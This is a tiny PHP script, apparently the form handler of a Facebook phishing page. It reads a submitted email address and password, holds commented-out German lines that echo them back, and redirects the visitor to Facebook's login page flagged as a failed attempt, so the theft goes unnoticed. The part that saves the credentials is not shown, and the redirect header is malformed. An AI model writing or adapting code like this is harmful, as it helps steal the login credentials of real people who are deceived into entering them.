<?php
$pass = $_POST['pass'];
$mail = $_POST['email'];
//echo "Deine E-Mail ist: ".$mail;
//echo "<br>Dein Passwort ist: ".$pass;

Header("LOCATION https://www.facebook.com/login.php?login_attempt=1");
?>